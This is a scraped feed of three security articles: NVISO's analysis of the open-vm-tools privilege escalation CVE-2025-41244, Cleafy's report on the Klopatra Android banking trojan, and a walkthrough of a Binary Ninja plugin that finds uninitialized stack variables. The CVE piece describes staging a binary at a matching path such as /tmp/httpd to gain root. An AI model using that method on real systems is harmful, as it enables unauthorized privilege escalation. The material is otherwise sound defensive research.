While VMware Aria Operations is proprietary, the VMware Tools are available as an open-source variant known as VMware’s open-vm-tools, distributed on most major Linux distributions. The following CVE-2025-41244 analysis is performed on this open-source component.Within open-vm-tools’ service discovery feature, the component handling the identification of a service’s version is achieved through the  shell script. As part of its logic, the  shell script has a generic  function. The function takes as argument a regular expression pattern, used to match supported service binaries (e.g., ), and a version command (e.g., ), used to indicate how a matching binary should be invoked to retrieve its version.When invoked,  loops , a list of all processes with a listening socket. For each process, it checks whether service binary (e.g., ) matches the regular expression and, if so, invokes the supported service’s version command (e.g., ).The  function is called using several supported patterns and associated version commands. While this functionality works as expected for system binaries (e.g., ), the usage of the broad‑matching  character class (matching non‑whitespace characters) in several of the regex patterns also matches non-system binaries (e.g., ). These non-system binaries are located within directories (e.g., ) which are writable to unprivileged users by design.By matching and subsequently executing non-system binaries (CWE-426: Untrusted Search Path), the service discovery feature can be abused by unprivileged users through the staging of malicious binaries (e.g., ) which are subsequently elevated for version discovery. As simple as it sounds, you name it, VMware elevates it.To abuse this vulnerability, an unprivileged local attacker can stage a malicious binary within any of the broadly-matched regular expression paths. A simple common location, abused in the wild by UNC5174, is . To ensure the malicious binary is picked up by the VMware service discovery, the binary must be run by the unprivileged user (i.e., show up in the process tree) and open at least a (random) listening socket.The following bare-bone  proof-of-concept can be used to demonstrate the privilege escalation.Once compiled to a matching path (e.g., go build -o /tmp/httpd CVE-2025-41244.go) and executed, the above proof of concept will spawn an elevated root shell as soon as the VMware metrics collection is executed. This process, at least in credential-less mode, has historically been documented to run every 5 minutes.Credential-based Service Discovery When service discovery operates in the legacy credential-based mode, VMware Aria Operations will eventually trigger the privilege escalation once it runs the metrics collector scripts. Following successful exploitation, the unprivileged user will have achieved code execution within the privileged context of the configured credentials. The beneath process tree was obtained by running the  command through the privilege escalation shell, where the entries until line 4 are legitimate and the entries as of line 5 part of the proof-of-concept exploit.Credential-less Service DiscoveryWhen service discovery operates in the modern credential-less mode, the VMware Tools will eventually trigger the privilege escalation once it runs the collector plugin. Following successful exploitation, the unprivileged user will have achieved code execution within the privileged VMware Tools user context. The beneath process tree was obtained by running the  command through the privilege escalation shell, where the first entry is legitimate and all subsequent entries (line 3 and beyond) part of the proof-of-concept exploit.Successful exploitation of CVE-2025-41244 can easily be detected through the monitoring of uncommon child processes as demonstrated in the above process trees. Being a local privilege escalation, abuse of CVE-2025-41244 is indicative that an adversary has already gained access to the affected device and that several other detection mechanisms have triggered.Under certain circumstances, exploitation may forensically be confirmed in legacy credential-based mode through the analysis of lingering metrics collector scripts and outputs under the /tmp/VMware-SDMP-Scripts-{UUID}/ folders. While less than ideal, this approach may serve as a last resort in environments without process monitoring on compromised machines. The following redacted metrics collector script was recovered from the /tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0.sh location and mentions the matched non-system service binary on its last line.While NVISO identified these vulnerabilities through its UNC5174 incident response engagements, the vulnerabilities’ trivialness and adversary practice of mimicking system binaries (T1036.005) do not allow us to determine with confidence whether UNC5174 willfully achieved exploitation.The broad practice of mimicking system binaries (e.g., ) highlight the real possibility that several other malware strains have accidentally been benefiting from unintended privilege escalations for years. Furthermore, the ease with which these vulnerabilities could be identified in the open-vm-tools source code make it unlikely that knowledge of the privilege escalations did not predate NVISO’s in-the-wild identification.2025-05-19: Forensic artifact anomaly noted during UNC5174 incident response engagement.2025-05-21: Forensic artifact anomaly attributed to unknown zero-day vulnerability.2025-05-25: Zero day vulnerability identified and reproduced in a lab environment.2025-05-27: Responsible disclosure authorized and initiated through Broadcom.2025-05-28: Responsible disclosure triaged, investigation started by Broadcom.2025-06-18: Embargo extended by Broadcom until no later than October to align release cycles.Maxime Thiebaut Incident Response & Threat Researcher Expert within NVISO CSIRT. He spends most of his time performing defensive research and responding to intrusions. Previously, Maxime worked on the SANS SEC699 course. Besides his coding capabilities, Maxime enjoys reverse engineering samples observed in the wild.]]></content:encoded></item><item><title>Klopatra: exposing a new Android banking trojan operation with roots in Turkey | Cleafy LABS</title><link>https://www.cleafy.com/cleafy-labs/klopatra-exposing-a-new-android-banking-trojan-operation-with-roots-in-turkey</link><author>/u/f3d_0x0</author><category>netsec</category><pubDate>Tue, 30 Sep 2025 09:11:39 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Klopatra's internal code structure reveals a level of sophistication that sets it apart from most Android malware. Its developers have made deliberate design choices to maximize evasion, resilience, and operational effectiveness.The Evasion Engine: Virbox and Native CodeThe most innovative feature of Klopatra is its multi-layered approach to evading analysis. At the heart of this strategy is the integration of , a Chinese commercial software protection solution. While using commercial packers and protectors like VMProtect is standard practice in, its adoption in the mobile landscape, particularly on Android, is still rare. This choice signals a significant escalation, indicating that operators invest financial resources to protect their malicious "assets."  Adopting Virbox is not a purely technical decision, but a strategic one. It drastically increases the time and expertise required for security researchers to reverse-engineer the malware. Virbox is combined with a firm reliance on native libraries (C/C++ code). Unlike typical Android malware that implements most of its logic in Java/Kotlin, Klopatra shifts its core functionalities to the native layer. This strategy offers two main advantages:  Powerful Layer of Protection: Moving the core functionality into native libraries drastically reduces its visibility to traditional detection tools and analysis frameworks.  It further integrates robust anti-debugging mechanisms, runtime integrity checks, and emulator detection routines designed to thwart analysis environments and prevent execution under controlled conditions.The RAT Framework: Remote Control and EspionageAt its core, Klopatra is a powerful Remote Access Trojan (RAT). It provides operators with granular, real-time control over the infected device. This capability is implemented through two main VNC (Virtual Network Computing) features:Standard VNC (start_vnc): The operator can view and interact with the victim's device screen remotely. The operator sees exactly what the user sees. This is the more dangerous mode. When activated, the malware displays a black screen on the victim's device (via the action_blackscreen command), making it seem like the phone is off or locked. Behind this screen, the operator has full control and can navigate through apps, enter PINs and passwords, and execute banking transactions without the victim's knowledge.The level of control is highly detailed, as demonstrated by the list of C2 commands (see Appendix A). Operators can perform a wide range of actions, including simulating taps at specific coordinates (), system button presses like "back" () and "home" (), and even executing complex gestures like swipes () and long-presses.The Financial Fraud Module: Overlays and Data ExfiltrationIn addition to direct device control, Klopatra employs the classic technique of  for large-scale credential theft. The malware maintains a list of target financial and cryptocurrency applications. When it detects the user opening one of these applications, Klopatra sends a request to the C2 server.The server responds with custom HTML content, which the malware displays as a dialog box over the legitimate app (via the command). This dialog box perfectly mimics the banking app's login screen, tricking users into entering their username and password. These credentials are captured and immediately sent to the C2 server.  In parallel, Klopatra performs comprehensive data collection. It gathers device information (model, manufacturer, battery level), a list of all installed applications (), and captures sensitive data such as keystrokes and clipboard content. All collected data is structured into a JSON object, Base64-encoded, and sent to the C2, providing operators with a detailed profile of each victim.Self-Preservation and DefenseKlopatra is designed to survive on the device for as long as possible. It uses Accessibility Services privileges to self-grant additional permissions, programmatically clicking "Allow" or "OK" buttons in system dialogs. It autonomously navigates to the battery optimization settings (command) to add itself to the exception list, preventing the operating system from terminating its background processes.Furthermore, Klopatra adopts active defensive measures. It contains a hardcoded list of package names belonging to popular security and AV solutions. If it detects one of these apps installed on the device, it may attempt to uninstall it to eliminate threats to its operation. Finally, it can simulate the "back" button press to prevent the user from easily accessing the settings screens where they might attempt to uninstall the malware.]]></content:encoded></item><item><title>An In-depth research-based walk-through of an Uninitialized Local Variable Static Analyzer</title><link>https://blog.cybervelia.com/p/an-in-depth-research-based-walk-through</link><author>/u/thnew_mammoth</author><category>netsec</category><pubDate>Tue, 30 Sep 2025 08:09:23 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Uninitialized local variables (ULVs) were once a common source of data leaks, crashes, and hard-to-explain bugs—ghosts of bad memory hygiene lurking in the stack. Today’s compilers are much better at catching them. But once binaries are stripped of metadata and debug info, those guarantees start to fade. So the question remains: are they really gone?In stripped binaries, ULVs are no longer obvious—they’re buried under layers of optimization, inlined code, and restructured control flow. The compilers did their job. But for reverse engineers working without source, that same optimization turns variable tracking into a detective’s game: rebuilding the stack layout, tracing every read and write in intermediate representation, and cutting through the noise introduced by aggressive compiler behavior. Just a reminder - at least two uninitialized local variable (ULV) vulnerabilities were discovered in the Linux kernel last year (CVE-2024-42228, CVE-2024-42225).This article presents a static analyzer based on Binary Ninja engine to take on that challenge. It walks through a complete ULV detection workflow—from recovering variables and analyzing how they’re used, to inferring sizes, tracking taints across functions, and filtering out misleading patterns. If an uninitialized read made it into your binary, this process will uncover it.Stack-based uninitialized reads occur when a function reads from a local variable before any code assigns a value. In C/C++, this can expose residual stack contents—potential passwords, pointers, or other sensitive data—and lead to undefined behavior. While modern compilers insert some zeroing or warnings, many ULVs slip through in performance-critical code or legacy modules.Static source analyzers can catch ULVs early, but in security research we often face only the compiled binary. Traditional disassembly and manual auditing are laborious and error-prone. My goal was to build an automated, accurate, and extensible Binary Ninja plugin that finds ULVs in stripped binaries with minimal human effort.Finally, we chose Binary Ninja for its exceptionally powerful analysis engine, even if its user interface could be improved. Its Python-accessible intermediate representation with full SSA support greatly simplifies static analysis. At the same time, it keeps us close to the underlying assembly while allowing a higher-level perspective—and, by using the right IR, ensures our workflow remains ISA-agnostic (almost…).Analyzing uninitialized local variables in a stripped binary comes with its own challenges. Since there's no extra information from the compiler, we don't know where variables start or how big they are. We have to figure out every stack variable just by looking at raw memory access patterns. Without type or symbol data, the only way to find variable boundaries is to study how memory is read from and written to. Small mistakes in this process can lead to missed bugs or confusing warnings.Things added by the compiler make it even harder to understand what the code is really doing. For example, saved frame pointers, return addresses, padding for alignment, and situations where the compiler splits a single variable into multiple pieces on the stack can all look like real variables when they’re not. We also have to deal with complex control flow, where a variable might be initialized in one code path but not another. If we just scan the code in order, we might miss cases where a variable is used before it’s initialized, or we might wrongly report an error when all paths actually set the variable.To make things even harder, variables are often initialized in helper functions that are called indirectly through pointers. This means that a write to a variable in one function might actually happen inside another function. If the analysis only looks at a single function, it might wrongly flag these safe pointer-based writes as problems.Also, in large binaries, a lot of code either never runs or runs very rarely—like dead code or rarely-used error handlers. These parts can cause warnings that don’t matter for real-world use.All of this means we need a broader kind of analysis that looks across functions. It has to be able to guess variable types and sizes without metadata, ignore extra data added by the compiler, and match what the code looks like with how it actually behaves when running.Having outlined the myriad challenges inherent in discovering uninitialized stack variables purely from binary code, we now turn to the heart of our solution: a script that automates this analysis. Leveraging Binary Ninja’s powerful Intermediate Language (IL) APIs, this plugin systematically reconstructs local variables, infers their sizes, tracks read‐before‐write occurrences, and propagates data flows across function boundaries. Keep in mind that this plugin is developed 4 years ago and this is a write-up for such an old plugin. The plugin works great, however, it needs the old version of BN which is 2.4.28x. After this version, vector35 changed their API engine from ground-up and I didn’t have time to keep-up and upgrade the implementation of this project. Nevertheless, even though the analyzer was written long ago, is still used today in our company and still can find vulnerabilities in modern binaries, while the logic does not rely on any modern libraries (the work done is static).Over the next sections, we will explore in depth how the plugin works:Discovers and filters stack locals using Binary Ninja’s stack_layout and configurable blacklists;Performs read‐before‐write analysis by scanning MLIL instructions to accurately distinguish reads and writes;Infers sizes for unknown‐width variables via a neighbor‐offset heuristic;Reconstructs inter-procedural coverage with a proximity‐based taint propagation across caller–callee relationships;Prunes false positives through sibling‐variable deduplication, pointer‐initiated initialization detection, and skips of specific-imported or dynamically called routines;Enriches results by importing IDA Pro symbols for human-friendly names and filtering findings with a lightweight PIN trace to focus on actually executed code paths.By the end of this discussion, you will see how each of these building blocks fits together into a coherent, end-to-end workflow—transforming a stripped binary into a prioritized list of genuine ULV warnings, ready for security review.reconstruct each function’s local variablesBinary Ninja exposes each function’s local and argument slots through the Function.stack_layout property. Each entry describes a variable’s source type, name, storage offset (relative to the frame pointer), and any type information that the decompiler could recover. In our implementation, we iterate over every function in the binary view, skipping well‐known boilerplate functions (e.g., _init, __libc_csu_init) via a small functions_blacklist_names list:functions_blacklist_names = ["__libc_csu_init", "_init", "_fini", "_start"]
allvars = {}

for func in bv.functions:
    if func.name in functions_blacklist_names:
        continue
    allvars[func.name] = {}
    for var in func.stack_layout:
        # ... candidate for further filtering ...At this stage, func.stack_layout may contain entries for saved registers (e.g. __saved_rbp), return addresses, padding, or true locals. We capture each one but delay committing it until after filtering.variable_blacklist_names = [
    "__saved_rbp", "__return_addr",
    "__saved_rbx", "__saved_r12"
]When populating our allvars structure, any Variable whose name matches an entry in this list is skipped:if var.name in variable_blacklist_names:
    continueThis ensures we only consider slots that are more likely to hold program data rather than ABI bookkeeping.Even after name-based blacklisting, some locals have no meaningful width or type. Binary Ninja may tag them as void (unknown type) or assign a width of zero when it cannot infer any size. Since a void or zero-width slot cannot yield a usable read or write, we optionally skip them via two flags:skip_void_vars      = False  # can be set to True to omit void-typed slots
skip_zero_size_vars = False  # can be set to True to omit zero-width slots

# inside the var loop:
if skip_void_vars and var.type.type_class == TypeClass.VoidTypeClass:
    continue

if skip_zero_size_vars and var.type.width == 0:
    continueBy default we leave these flags off (to maximize coverage), but they can be turned on for noise reduction in very large binaries.Depending on calling convention, some function parameters may also appear in stack_layout. Since our focus is on automatic locals (and not on uninitialized caller-provided arguments), we exclude any variable whose storage is positive (i.e., above the frame pointer):if var.storage > 0:
    # var.storage > 0 typically indicates a pushed‐in argument
    continueallvars[func.name][var.name] = {
    "func_obj":    func,
    "func_address":func.start,
    "type":        var.type,
    "storagetype": var.source_type,
    "offset":      var.storage + 8,
    "size":        var.type.width,
    "assigned":    0
}That assigned field will later transition to 1 (read), 2 (written), or 3 (filtered false positive).Once we have a concise list of candidate locals in each function, the next step is to determine which of those are ever read before being written. A true uninitialized‐use occurs when an instruction consumes a variable’s value without any prior assignment. To detect this, the plugin leverages Binary Ninja’s Medium-Level IL (MLIL), which maps raw memory operations into explicit variable reads and writes, greatly simplifying the analysis.instr.vars_read: the list of variables whose current version appears on the right-hand side (a read).instr.vars_written: the list of variables that are assigned by this instruction (a write).We track three states in each local’s assigned field:The core loop looks like this:# Initialize all locals to “unvisited”
for func in allvars:
    for v in allvars[func].values():
        v["assigned"] = 0

# Scan MLIL instructions for reads and writes
for func in bv.functions:
    if func.name not in allvars:
        continue

    for instr in func.mlil_instructions:
        # Mark reads that occur before any write
        for vr in instr.vars_read:
            entry = allvars[func.name].get(vr.name)
            if entry and entry["assigned"] == 0:
                entry["assigned"] = 1

        # Mark any writes (these clear a previous “read-only” state)
        for vw in instr.vars_written:
            entry = allvars[func.name].get(vw.name)
            if entry:
                entry["assigned"] = 2By using MLIL’s explicit variable tracking rather than raw disassembly, this approach accurately captures read-before-write behavior—even in the presence of compiler optimizations such as reordering of memory operations or introduction of temporary variables. In the next section, we will see how unknown sizes are inferred for zero-width locals, enabling us to distinguish partial from full initialization.During initial discovery (see Section 1), each local’s size is set to var.type.width. If that width is zero and the flags fix_zero_size_vuln_var is enabled while skip_zero_size_vars is disabled, the plugin calls predictSize to compute a nonzero length:elif skip_zero_size_vars == False and fix_zero_size_vuln_var and var.type.width == 0:
    var_size = predictSize(var, func.stack_layout)This ensures that every local we analyze has a meaningful “size” associated with its stack offset.Most compilers allocate locals contiguously in the prologue, reserving one block of stack space for all variables. By measuring the distance to the next allocated slot, we obtain a conservative upper bound on the buffer’s length without needing symbolic execution or partial SSA reconstruction. This inferred size is critical when later determining whether a given function’s writes fully cover the buffer or leave trailing bytes uninitialized.With every local now annotated with either its original width or an inferred size, the plugin can accurately distinguish:This size inference lays the groundwork for precise interprocedural coverage analysis in the next stage.A key insight in uncovering real ULVs is that uninitialized data often traverses multiple functions before it is ultimately consumed. To expose these propagation chains, the plugin correlates the point of uninitialized read in one function (“Affected”) with potential initializer calls in its callers (“Middle” and “Parent”). This interprocedural analysis proceeds in two phases: identifying cross-references between functions, and then determining which callee writes cover the target stack offset most closely before the uninitialized read.First, for each function func that contains a ULV candidate var, we locate:All callers of func via bv.get_callers(func.start).All xrefs (cross-references) within each caller where func is invoked, using:def getFunctionReferencedAddresses(func, parent_func):
	total_refs = list()
	func_xrefs = bv.get_callers(func.start)
	for f_xref in func_xrefs:
		if f_xref.function.name == parent_func.name:
			total_refs.append({"xref":f_xref, "index":parent_func.get_llil_at(f_xref.address).instr_index})
	return total_refsEach record contains both the xref object (with its address) and the MLIL instruction index, which we use to compare ordering within the parent function.Within each parent function, we also enumerate all its callees (other functions it calls) and gather their xrefs in the same way. For each potential “middle” function call, we now have the list of points in the parent where it is invoked.For each uninitialized‐read reference (var_ref) in the parent, we look backwards at all candidate calls to see which one both:Occurs before var_ref in the instruction stream (i.e., xref.address < var_ref.address and xref.index < var_ref.index), andWrites to the stack offset of interest, as determined by func_called(callee, var_offset, var_size).The plugin computes a simple distance metric—var_ref.address - callee_xref.address—and selects the callee with the smallest positive distance. This “closest writer” is most likely responsible for initializing (or partially initializing) the buffer before its uninitialized use:best_distance = None
best_cover    = VAR_NOCOVER
for parent_out in parent_out_refs:
    for call_record in parent_out["xrefs"]:
        if call_record["xref"].address < var_ref["xref"].address:
            distance = var_ref["xref"].address - call_record["xref"].address
            cover_info = func_called(parent_out["parent_out"],
                                     offset, size)[0]["cover"]
            if cover_info != VAR_NOCOVER and (best_distance is None or distance < best_distance):
                best_distance = distance
                best_cover    = cover_info
                best_callee   = parent_out["parent_out"]
                best_xref     = call_record["xref"].addressHere, func_called inspects the callee’s own MLIL for writes at the given offset and returns VAR_FULL_COVER, VAR_PARTIAL_COVER, or VAR_NOCOVER.Once the best covering function is identified, we record a propagation record linking:Sibling-Variable DeduplicationStatic Duplicate-Offset FilteringRead/Write Assignment TrackingVoid-Type and Zero-Size Variable FilteringImported-Function Coverage SkipsCalls to external libraries or dynamically linked functions have unknown behavior when it comes to local stack variables. To avoid wrongly assuming that these functions initialize or interact with locals, the plugin checks if the called function is located in the PLT (Procedure Linkage Table) or in an external range defined by the user. If a function is identified this way, it’s treated as having “no coverage” for the target variable—meaning it’s not credited with initializing it. This prevents the analysis from incorrectly suppressing uninitialized local variable (ULV) warnings when the real behavior of the external function isn’t known.However, this area is still uncertain. In some cases, external functions do play a critical role in initialization, and treating them as “no coverage” can lead to extra false positives. Because of that, we leave this as a configurable option—a flag the researcher can turn on or off. Whether to include these functions in the analysis depends on the specific binary and how much false-positive noise you're willing to tolerate based on how these external calls behave.Dynamic-Function-Address HeuristicWhen a function call goes through a register or function pointer, its target can’t be figured out just by looking at the static code. So, the analysis can’t tell if the function being called actually writes to the variable or not. To avoid making unsafe assumptions, there’s a setting you can turn on that tells the plugin to play it safe: if the call target is unknown, just assume it might initialize the variable. In that case, the possible uninitialized variable is removed from the report.This heuristic helps cut down on false positives caused by indirect calls, where the real behavior of the function isn’t visible in static analysis.Finally, a Unified False-Positive MarkingTo transform raw ULV candidates into actionable findings, the plugin incorporates two complementary enrichment steps: importing accurate function names from an IDA Pro export, and filtering static results against a dynamic call trace captured with Intel PIN.Stripped binaries lack meaningful symbols, making it difficult to triage ULV reports. To remedy this, the plugin can ingest a JSON mapping of function names to addresses generated by a IDA Pro script. This mapping is produced by an IDA Python script such as:# In IDA Pro:
import idautils, idc, idaapi, json

ida_map = {}
for addr in idautils.Functions():
    name = idc.get_func_name(addr)
    ida_map[name] = hex(addr)

with open("ida_funcs.json", "w") as f:
    json.dump(ida_map, f)Within the Binary Ninja plugin, these symbols are defined before analysis begins:def loadIdaFuncNames(fname):
    ida_functions = json.loads(open(fname, "r").read())
    for funcname, addr_hex in ida_functions.items():
        addr = int(addr_hex, 16)
        sym = Symbol("FunctionSymbol", addr, funcname)
        bv.define_user_symbol(sym)By calling loadIdaFuncNames("ida_funcs.json"), Binary Ninja’s symbol table is populated with human-readable names. Subsequent ULV reports (in JSON or text) reference these names and addresses directly, greatly simplifying vulnerability triage and patching.Static analysis can over-report in dead or rarely exercised code paths. To focus on vulnerabilities that matter under real workloads, we use a minimal PIN tool that logs every executed function call, then cross-references this trace with the ULV findings.PIN Instrumentation (C++):... SNIP ...

// Called before every call instruction
VOID OnCall(ADDRINT ip, ADDRINT target) {
    out << std::hex << ip << " " << target << "\n";
}

VOID Trace(TRACE trace, VOID *) {
    for (BBL bbl = TRACE_BblHead(trace);
         BBL_Valid(bbl); bbl = BBL_Next(bbl)) {
        for (INS ins = BBL_InsHead(bbl);
             INS_Valid(ins); ins = INS_Next(ins)) {
            if (INS_IsCall(ins)) {
                INS_InsertPredicatedCall(
                    ins, IPOINT_BEFORE, (AFUNPTR)OnCall,
                    IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_END);
            }
        }
    }
}

... SNIP ...Parsing and Filtering in Python:In the ULV parsing script, we load the PIN trace and build a set of covered functions:def filterWithTrace(fname):
    trace = {}
    lines = open(fname).read().splitlines()
    # First line is the image base; skip or record if needed
    for line in lines[1:]:
        src_hex, dst_hex = line.split()
        # Normalize addresses relative to image base here if necessary
        trace.setdefault(dst_hex, []).append(src_hex)
    return trace

# Later, when printing each ULV record:
if analyze_trace_file:
    trace = filterWithTrace("pinout.txt")
    # Skip any ULV whose functions were not covered
    if (hex(vuln_addr) not in trace or
        hex(middle_addr) not in trace or
        hex(affected_addr) not in trace):
        continue
    ... display results ...By enriching static ULV data with IDA Pro symbols and PIN-driven coverage, the plugin delivers a final output that is both human-readable and focused on real execution paths—a powerful combination for efficient vulnerability review and triage.Structured JSON IngestionColorized, Intuitive Console OutputFlexible Whitelists and BlacklistsHigh-Level Relationship OverviewTogether, these features make the parser not just a reporting tool, but an interactive companion in the vulnerability-discovery process—one that adapts to our evolving needs, surfaces the most relevant findings, and accelerates the path from analysis to remediation.Finding uninitialized stack variables in a stripped binary can feel like hunting ghosts in the machine. With this Binary Ninja plugin, however, the process becomes clear and manageable. We start by rebuilding each function’s local variables from the stack frame, then use MLIL to spot any reads that happen before a write. When the size of a buffer is unknown, a simple neighbor-offset trick fills in the gaps. Next, we follow the data across functions to see exactly where it was partially initialized and then finally used without initialization. False alarms are swept away by combining sibling-variable checks, pointer-taint tracking, and sensible skips for external or indirect calls.To make the results truly actionable, we round out the approach with two powerful additions: importing accurate function names from an IDA Pro export, and filtering against a real execution trace captured by PIN. This means every warning in your report isn’t just a line in a file—it’s a named function that you know actually ran, with a clear story of how uninitialized data flowed through your code.In practice, this workflow turns a daunting manual effort into an automated, repeatable audit. Whether you’re examining legacy software with no source or vetting a new build for hidden leaks, this plugin shines a spotlight on the most critical uninitialized-variable issues first.We also welcome collaboration with universities, research institutes, and industry partners on shared projects. If you’d like to discuss joint research or integration efforts, please feel free to connect with the author on LinkedIn (Theodoros Danos) or send an email to Cybervelia. We look forward to exploring new opportunities together!The analyzer’s code is strictly available only to selected research institutes.We would like to blend-in some SMT-solvers in order to glue the sinks with the affected variables. That would be really cool but symbex requires a bit more effort and that alone is just one of the ideas.Our current interprocedural analysis examines only a single level of the call stack when correlating functions. Extending this to multiple layers would greatly enhance our ability to trace complex call chains. For example, consider a scenario where Function A calls B, B calls C, and C calls D—and it is D’s behavior that is ultimately influenced by an uninitialized variable in A. With multi-layer depth, we could uncover that relationship; as it stands, we only analyze direct parent-child interactions.Another enhancement is to grab and enhance the function names such as including System map and other files which will help the function-name decoding - even though this has nothing to do with ULV, it simplifies the whole process.Finally, it would be super-interesting if we would involve LLMs to validate/invalidate affected functions found by the tool!]]></content:encoded></item></channel></rss>